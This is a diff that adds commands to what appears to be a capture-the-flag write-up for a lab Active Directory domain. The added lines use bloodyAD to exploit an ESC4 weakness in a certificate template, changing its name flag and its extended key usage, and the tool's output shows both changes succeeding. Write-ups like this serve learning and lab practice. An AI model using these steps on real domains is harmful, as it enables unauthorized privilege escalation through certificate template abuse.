@@ -1227,6 +1227,14 @@ Now using that TGT in bloodyAD i can see the same thing
 
 The output suggests this is vulnerable to ESC4
 
+```python
+❯❯❯ faketime -f +8h bloodyAD --host dc1.ping.htb -d pong.htb -k set object "CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb" mspki-certificate-name-flag -v 1         
+[+] CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb's msPKI-Certificate-Name-Flag has been updated
+
+❯❯❯ faketime -f +8h bloodyAD --host dc1.ping.htb -d pong.htb -k set object "CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb" pKIExtendedKeyUsage -v "1.3.6.1.5.5.7.3.2"            
+[+] CN=SmartcardAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=ping,DC=htb's pKIExtendedKeyUsage has been updated
+```
+
 
 
 
